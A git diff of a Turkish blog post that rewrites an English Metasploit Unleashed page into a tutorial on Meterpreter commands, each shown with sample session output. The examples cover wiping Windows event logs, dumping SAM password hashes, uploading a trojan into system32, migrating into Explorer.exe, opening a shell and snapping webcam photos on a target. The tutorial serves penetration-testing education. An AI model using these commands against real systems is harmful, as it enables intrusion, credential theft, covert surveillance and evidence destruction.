@@ -1,10 +1,10 @@
 ---
 layout: post
-title: Metasploit İçinde Meterpreter Temel Komutları
-date: 2017-05-14 08:10:06.000000000 +02:00
+title: Metasploit İçinde Meterpreter Komutları
+date: 2017-05-14 08:15:06.000000000 +02:00
 type: post
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -12,19 +12,21 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework payload
-- msf payload türleri
-excerpt: Payload, bir exploit modül türünü ifade eder. Metasploit Framework içerisinde 3 farklı grup payload modülü bulunur. Tekil, Sahneleyiciler ve Sahneler (Singles, Stagers ve Stages) olarak ayırabileceğimiz bu modüllere bakacağız. 
+- Metasploit Framework meterpreter
+- meterpreter komutları
+
+excerpt: Bir önceki yazıda, kısaca Meterpreter'in ne olduğunu açıklamıştık. Şimdi de kullanılabilecek komutları detaylarıyla göreceğiz. Burada hemen hemen tüm komutlar açıklanmaya çalışılsa da bir kaç komut, ancak tecrübeyle anlaşılacağından eksik bırakılmıştır. Onları da zamanla açıklığa kavuşturacağız.
 ---
 
-Using Meterpreter Commands
+Bir önceki yazıda, kısaca Meterpreter'in ne olduğunu açıklamıştık. Şimdi de kullanılabilecek komutları detaylarıyla göreceğiz. Burada hemen hemen tüm komutlar açıklanmaya çalışılsa da bir kaç komut, ancak tecrübeyle anlaşılacağından eksik bırakılmıştır. Onları da zamanla açıklığa kavuşturacağız.
 
-Since the Meterpreter provides a whole new environment, we will cover some of the basic Meterpreter commands to get you started and help familiarize you with this most powerful tool. Throughout this course, almost every available Meterpreter command is covered. For those that aren’t covered, experimentation is the key to successful learning.
+# Meterpreter Komutları
 
-help
+## help
 
-The ‘help‘ command, as may be expected, displays the Meterpreter help menu.
+Adından da anlaşılacağı gibi, Meterpreter içinde ```help``` komutunu verdiğinizde kullanılabilir komutları listeler ve kısa açıklamaları verir. 
 
+```sh
 meterpreter > help
 
 Core Commands
@@ -36,23 +38,25 @@ Core Commands
     background    Backgrounds the current session
     channel       Displays information about active channels
 ...snip...
- 
+``` 
 
-background
+## background
 
-The ‘background‘ command will send the current Meterpreter session to the background and return you to the msf prompt. To get back to your Meterpreter session, just interact with it again.
+```background``` komutu, aktif olan Meterpreter oturumunu (session) arka plana gönderir ve sizi tekrar ```msf >``` komut istemcisine getirir. Arka plandaki Meterpreter oturumuna geçmek için ```sessions``` komutundan faydalanabilirsiniz. 
 
+```sh
 meterpreter > background
 msf exploit(ms08_067_netapi) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter >
- 
+``` 
 
-cat
+## cat
 
-The ‘cat‘ command is identical to the command found on *nix systems. It displays the content of a file when it’s given as an argument.
+Linux işletim sistemlerinde ```cat``` komutu, bir dosya içeriğini ekrana yazdırmada kullanılır. Meterpreterde de aynı işe yarar. 
 
+```sh
 meterpreter > cat
 Usage: cat file
 
@@ -61,63 +65,49 @@ meterpreter > cat edit.txt
 What you talkin' about Willis
 
 meterpreter >
- 
+```
 
-cd > pwd
+## cd > pwd
 
-The ‘cd‘ > ‘pwd‘ commands are used to change and display current working directly on the target host.
-The change directory “cd” works the same way as it does under DOS and *nix systems.
-By default, the current working folder is where the connection to your listener was initiated.
+```cd``` komutu ile klasör değişimi yapılır. ```pwd``` komutu ile aktif olarak hangi klasörde olduğumuz görülebilir. 
 
-ARGUMENTS:
-
-cd:	Path of the folder to change to
-pwd:	None required
-Example usuage:
-
+```sh
 meterpreter > pwd
 c:\
 meterpreter > cd c:\windows
 meterpreter > pwd
 c:\windows
 meterpreter >
- 
+``` 
 
-clearev
+## clearev
 
-The ‘clearev‘ command will clear the Application, System, and Security logs on a Windows system. There are no options or arguments.
+```clearev``` komutu, Clear Evidence yani delilleri temizleme anlamına gelir. Karşı tarafta açılan oturumda oluşturulan **log** dosyalarını temizlemeye çalışır.
 
-Before using Meterpreter to clear the logs | Metasploit Unleashed
-Before using Meterpreter to clear the logs | Metasploit Unleashed
-Example usage:
-Before
-
+```sh
 meterpreter > clearev
 [*] Wiping 97 records from Application...
 [*] Wiping 415 records from System...
 [*] Wiping 0 records from Security...
 meterpreter >
-After using Meterpreter to clear the logs | Metasploit Unleashed
-After using Meterpreter to clear the logs | Metasploit Unleashed
-After
+```
 
-download
+## download
 
-The ‘download‘ command downloads a file from the remote machine. Note the use of the double-slashes when giving the Windows path.
+Karşı bilgisayardan bir dosya indirmeye yarar. İndirilen dosya, metasploit'i başlatırken yerel sisteminizde hangi klasördeyseniz, oraya kaydedilir. 
 
+```sh
 meterpreter > download c:\\boot.ini
 [*] downloading: c:\boot.ini -> c:\boot.ini
 [*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
 meterpreter >
- 
+``` 
 
-edit
+## edit
 
-The ‘edit‘ command opens a file located on the target host.
-It uses the ‘vim’ so all the editor’s commands are available.
+```edit``` komutu, karşı taraftaki bilgisayarda bulunan bir dosyayı düzenlemek üzere ```vim``` editörde açar. Vim Editör kullanımı için [Vim](http://www.vim.org/) sayfasına bakabilirsiniz. 
 
-Example usage:
-
+```sh
 meterpreter > ls
 
 Listing: C:\Documents and Settings\Administrator\Desktop
@@ -131,15 +121,13 @@ Mode              Size    Type  Last modified              Name
 100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt
 
 meterpreter > edit edit.txt
- 
+``` 
 
-Please refer to the vim editor documentation for more advance use.
-http://www.vim.org/
+## execute
 
-execute
+```execute``` komutu, karşı tarafta bir komut çalıştırmanızı sağlar. Dikkat ederseniz, Meterpreter'in kendi komutları çalıştırılmamakta. Karşı tarafın komut istemcisinde bir komut çalıştırılmaktadır. 
 
-The ‘execute‘ command runs a command on the target.
-
+```sh
 meterpreter > execute -f cmd.exe -i -H
 Process 38320 created.
 Channel 1 created.
@@ -147,21 +135,23 @@ Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32>
- 
+```
 
-getuid
+## getuid
 
-Running ‘getuid‘ will display the user that the Meterpreter server is running as on the host.
+Karşı tarafta Meterpreter'in çalıştığı sistemin kullanıcı kimliğini görüntüler.
 
+```sh
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter >
- 
+``` 
 
-hashdump
+## hashdump
 
-The ‘hashdump‘ post module will dump the contents of the SAM database.
+```hashdump``` komutu, karşı taraftaki bilgisayarın SAM veri tabanını ortaya çıkarır. Tabii ki önceki Veri tabanı yazımızda belirttiğimiz gibi Workspace kullanıyorsanız, ```loot``` tablosuna kayıt eder.
 
+```sh
 meterpreter > run post/windows/gather/hashdump 
 
 [*] Obtaining the boot key...
@@ -177,21 +167,23 @@ HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6
 SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
 victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
 meterpreter >
- 
+``` 
 
-idletime
+## idletime
 
-Running ‘idletime‘ will display the number of seconds that the user at the remote machine has been idle.
+Karşı taraftaki bilgisayar kullanıcısının, ne kadar zamandır işlem yapmadığını gösterir.
 
+```sh
 meterpreter > idletime
 User has been idle for: 5 hours 26 mins 35 secs
 meterpreter >
- 
+```
 
-ipconfig
+## ipconfig
 
-The ‘ipconfig‘ command displays the network interfaces and addresses on the remote machine.
+Karşı bilgisayarın ağ bilgilerini görüntüler.
 
+```sh
 meterpreter > ipconfig
 
 MS TCP Loopback interface
@@ -205,20 +197,15 @@ IP Address  : 192.168.1.104
 Netmask     : 255.255.0.0
 
 meterpreter >
- 
+``` 
 
 lpwd > lcd
 
-The ‘lpwd‘ > ‘lcd‘ commands are used to display and change the local working directory respectively.
-When receiving a Meterpreter shell, the local working directory is the location where one started the Metasploit console.
-Changing the working directory will give your Meterpreter session access to files located in this folder.
+Meterpreter komut satırı açık iken vereceğiniz komutlar karşı taraf bilgisayarda işlem yaparlar. Halbuki biz kendi bilgisayarımızda bulunduğumuz klasörü görmek veya değiştirmek isteyebiliriz. Bu durumda Meterpreter'i geri plana göndermeden ```lpwd``` ve ```lcd``` komutlarıyla bu işlemi yapabiliriz. 
+```lpwd```: Yerel bilgisayarda hangi klasörde olduğumuzu gösterir. (local print working directory)
+```lcd```: Yerel bilgisayarda istediğimiz klasöre geçmeye yarar. (local call directory)
 
-ARGUMENTS:
-
-lpwd:		None required
-lcd:		Destination folder
-Example usage:
-
+```sh
 meterpreter > lpwd
 /root
 
@@ -230,12 +217,13 @@ meterpreter > lcd /var/www
 meterpreter > lpwd
 /var/www
 meterpreter >
- 
+``` 
 
-ls
+# ls
 
-As in Linux, the ‘ls‘ command will list the files in the current remote directory.
+Linux İşletim sistemindeki ```ls``` komutuyla aynı işlemi yapar. Bulunulan klasördeki dosya ve klasörleri listeler. 
 
+```sh
 meterpreter > ls
 
 Listing: C:\Documents and Settings\victim
@@ -248,14 +236,13 @@ Mode              Size     Type  Last modified                   Name
 100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
 40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
 ...snip...
- 
+``` 
 
- 
+# migrate
 
-migrate
+Meterpreter sunucumuz, karşı tarafta svchost.exe dosyasının içinde çalışıyor olabilir. Bunu başka bir programın içine gömülü hale getirmek istediğimizde ```migrate``` yani "göç et" komutunu kullanırız.
 
-Using the ‘migrate‘ post module, you can migrate to another process on the victim.
-
+```
 meterpreter > run post/windows/manage/migrate 
 
 [*] Running module against V-MAC-XP
@@ -264,12 +251,13 @@ meterpreter > run post/windows/manage/migrate
 [*] Migrating into process ID 816
 [*] New server process: Explorer.EXE (816)
 meterpreter >
- 
+``` 
 
-ps
+## ps
 
-The ‘ps‘ command displays a list of running processes on the target.
+Hedef bilgisayarda çalışan tüm işlemleri görüntüler. 
 
+```sh
 meterpreter > ps
 
 Process list
@@ -281,23 +269,22 @@ Process list
     152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
     288   snmp.exe              C:\WINDOWS\System32\snmp.exe
 ...snip...
- 
+``` 
 
-resource
+## resource
 
-The ‘resource‘ command will execute Meterpreter instructions located inside a text file. Containing one entry per line, “resource” will execute each line in sequence. This can help automate repetitive actions performed by a user.
+Karşı bilgisayara bağlandığınızda, yaptığınız işlemlerin bir süre sonra aynı şeyler olduğunu fark edersiniz. Örneğin, ```ls``` komutunu ver, ```cd c:\\Program Files``` ile programlar klasörüne gir vb. işlemleri hemen her zaman yaparsınız. İşte yerel bilgisayarda bir dosyaya, her satırda bir komut olacak şekilde bu işlemleri kayıt edip karşı tarafta çalıştırabilirsiniz. Bunun gerçekleşmesi için ```resource``` komutu kullanılmaktadır. 
 
-By default, the commands will run in the current working directory (on target machine) and resource file in the local working directory (the attacking machine).
+Burada dikkat edilmesi gereken konu, resource komutuna ilk vereceğiniz dosya yerele hangi klasördeyseniz (```lpwd```) orada aranır. İkinci parametre ise karşı tarafta hangi klasörde bulunuyorsanız (pwd) orada çalıştırılır.
 
+```sh
 meterpreter > resource 
 Usage: resource path1 path2Run the commands stored in the supplied files.
 meterpreter >
 ARGUMENTS:
 
-path1:		The location of the file containing the commands to run.
-Path2Run:	The location where to run the commands found inside the file
-Example usage
-Our file used by resource:
+path1:		Yerel klasörümüzde bulunan toplu iş dosyamız.
+Path2Run:	Komutların çalıştırılacağı karşı klasör
 
 root@kali:~# cat resource.txt
 ls
@@ -325,22 +312,13 @@ Mode              Size    Type  Last modified              Name
 
 [*] Backgrounding session 1...
 msf  exploit(handler) >
-
+```
  
+## search
 
-search
+Karşı sistemde arama yapmamızı sağlar. 
 
-The ‘search‘ commands provides a way of locating specific files on the target host. The command is capable of searching through the whole system or specific folders.
-Wildcards can also be used when creating the file pattern to search for.
-
-meterpreter > search
-[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
-ARGUMENTS:
-
-File pattern:	 	May contain wildcards
-Search location:	Optional, if none is given the whole system will be searched.
-Example usage:
-
+```sh
 meterpreter > search -f autoexec.bat
 Found 1 result...
     c:\AUTOEXEC.BAT
@@ -348,12 +326,13 @@ meterpreter > search -f sea*.bat c:\\xamp\\
 Found 1 result...
     c:\\xampp\perl\bin\search.bat (57035 bytes)
 meterpreter >
- 
+``` 
 
-shell
+## shell
 
-The ‘shell‘ command will present you with a standard shell on the target system.
+```shell``` komutu, Meterpreter içinde karşı sistemin Command Prompt satırına girmenizi sağlar.
 
+```sh
 meterpreter > shell
 Process 39640 created.
 Channel 2 created.
@@ -361,62 +340,41 @@ Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32>
- 
+``` 
 
-upload
+## upload
 
-As with the ‘download‘ command, you need to use double-slashes with the upload command.
+Karşı sisteme bir dosya yüklemenizi sağlar. Hedef sistemin dosya gösterim notasyonu dikkate alınmalıdır. Ters tırnaklara dikkat edilmelidir.
 
+```sh
 meterpreter > upload evil_trojan.exe c:\\windows\\system32
 [*] uploading  : evil_trojan.exe -> c:\windows\system32
 [*] uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
 meterpreter >
- 
+``` 
 
-webcam_list
+## webcam_list
 
-The ‘webcam_list‘ command when run from the Meterpreter shell, will display currently available web cams on the target host.
+Hedef sistemde kullanılabilir durumda olan web kameralarını listeler. 
 
-Example usage:
-
+```sh
 meterpreter > webcam_list
 1: Creative WebCam NX Pro
 2: Creative WebCam NX Pro (VFW)
 meterpreter >
- 
+``` 
 
-webcam_snap
+## webcam_snap
 
-The ‘webcam_snap’ command grabs a picture from a connected web cam on the target system, and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename.
+Hedef sistemin web kamerasından bir adet fotoğraf alır ve yerelde bulunduğunuz klasöre .jpeg formatında kayıt eder. 
 
-meterpreter > webcam_snap -h
-Usage: webcam_snap [options]
-Grab a frame from the specified webcam.
-
-OPTIONS:
-
-    -h      Help Banner
-    -i >opt>  The index of the webcam to use (Default: 1)
-    -p >opt>  The JPEG image path (Default: 'gnFjTnzi.jpeg')
-    -q >opt>  The JPEG image quality (Default: '50')
-    -v >opt>  Automatically view the JPEG image (Default: 'true')
-
-meterpreter >
-OPTIONS:
-
--h:	Displays the help information for the command
--i opt:	If more then 1 web cam is connected, use this option to select the device to capture the
-        image from
--p opt:	Change path and filename of the image to be saved
--q opt:	The imagine quality, 50 being the default/medium setting, 100 being best quality
--v opt:	By default the value is true, which opens the image after capture.
- 
-
-Example usage:
-
+```sh
 meterpreter > webcam_snap -i 1 -v false
 [*] Starting...
 [+] Got frame
 [*] Stopped
 Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg
 meterpreter >
+```
+
+Böylece Meterpreter komutlarını ve örnek kullanımlarını görmüş olduk. Anlatılmasını istediğiniz diğer başlıkları bize bildirebilirsiniz.
